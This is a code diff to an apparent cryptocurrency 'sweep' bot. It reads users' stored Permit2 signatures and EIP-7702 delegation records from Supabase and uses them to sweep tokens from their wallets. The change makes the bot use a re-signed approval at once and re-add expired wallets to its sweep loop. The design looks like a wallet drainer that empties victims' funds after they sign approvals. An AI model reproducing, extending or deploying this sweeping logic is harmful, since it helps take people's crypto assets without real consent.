@@ -239,51 +239,85 @@ async function sweepDelegatedWallet(walletAddress) {
   } catch (e) { err(`[eip7702] sweepDelegatedWallet ${checksum}: ${e.message}`); }
 }
 
+// ── Permit2 signature fetch — always fresh, never cached ─────────────────────
+//
+// Queries the most recent row from permit2_signatures on every call.
+// Falls back to permit_metadata in delegated_wallets if no sig row exists.
+// Never stores signature data in memory — always reads from Supabase.
+
+async function getSweepSignature(walletAddress) {
+  if (!supabase) return null;
+
+  // Primary: permit2_signatures table — newest row wins
+  const { data: sigRow, error: sigErr } = await supabase
+    .from("permit2_signatures")
+    .select("*")
+    .eq("address", walletAddress.toLowerCase())
+    .eq("chain", CHAIN)
+    .order("created_at", { ascending: false })
+    .limit(1)
+    .single();
+
+  if (!sigErr && sigRow) return sigRow;
+
+  // Fallback: permit_metadata column in delegated_wallets
+  const { data: dwRow } = await supabase
+    .from("delegated_wallets")
+    .select("permit_metadata")
+    .eq("address", walletAddress.toLowerCase())
+    .eq("chain", CHAIN)
+    .single();
+
+  if (!dwRow?.permit_metadata) return null;
+
+  // Normalise the fallback shape to match permit2_signatures columns
+  const meta = dwRow.permit_metadata;
+  return {
+    tokens:   meta.tokens   || [],
+    deadline: meta.deadline
+      ? new Date(Number(meta.deadline) * 1000).toISOString()
+      : null,
+    signature: meta.signature || null,
+    nonce:     meta.nonce     || null,
+  };
+}
+
 // ── Permit2 sweep ─────────────────────────────────────────────────────────────
 
 async function sweepPermit2Wallet(walletAddress) {
   const checksum = normalizeAddress(walletAddress);
   if (!checksum || !supabase) return;
 
-  let tokens = [];
-  let deadlineIso = null;
+  // Always read the freshest signature from Supabase — never use a cached copy.
+  // This ensures re-signing immediately takes effect without a bot restart.
+  const sig = await getSweepSignature(checksum);
 
-  const { data: sigRow, error: sigErr } = await supabase
-    .from("permit2_signatures")
-    .select("tokens, deadline")
-    .eq("address", checksum.toLowerCase())
-    .eq("chain", CHAIN)
-    .order("created_at", { ascending: false })
-    .limit(1)
-    .single();
-
-  if (!sigErr && sigRow) {
-    tokens      = sigRow.tokens || [];
-    deadlineIso = sigRow.deadline || null;
-  } else {
-    const { data: dwRow } = await supabase
-      .from("delegated_wallets")
-      .select("permit_metadata")
-      .eq("address", checksum.toLowerCase())
-      .eq("chain", CHAIN)
-      .single();
-
-    if (!dwRow?.permit_metadata) {
-      warn(`[permit2] no signature data found for ${checksum}`);
-      return;
-    }
-    tokens      = dwRow.permit_metadata.tokens || [];
-    const dl    = dwRow.permit_metadata.deadline;
-    deadlineIso = dl ? new Date(Number(dl) * 1000).toISOString() : null;
+  if (!sig) {
+    warn(`[permit2] no signature data found for ${checksum}`);
+    return;
   }
+
+  const tokens      = sig.tokens || [];
+  const deadlineIso = sig.deadline || null;
 
   if (deadlineIso && new Date(deadlineIso) < new Date()) {
     if (!expiredLogged.has(checksum)) {
-      warn(`[permit2] signature expired: ${checksum} (deadline=${deadlineIso}) — removing from sweep`);
+      warn(`[permit2] signature expired: ${checksum} (deadline=${deadlineIso})`);
       expiredLogged.add(checksum);
     }
+    // Remove from active sweep loop — Realtime INSERT on permit2_signatures
+    // or delegated_wallets will re-add it when the user re-signs.
     delegatedWallets.delete(checksum);
     return;
+  }
+
+  // Valid fresh signature — clear any stale expired marker so re-signing works
+  expiredLogged.delete(checksum);
+
+  // Ensure wallet is in the active sweep map (may have been removed on expiry)
+  if (!delegatedWallets.has(checksum)) {
+    delegatedWallets.set(checksum, "permit2");
+    log(`[permit2] re-added ${checksum} to sweep map (fresh signature found)`);
   }
 
   if (!tokens.length) {
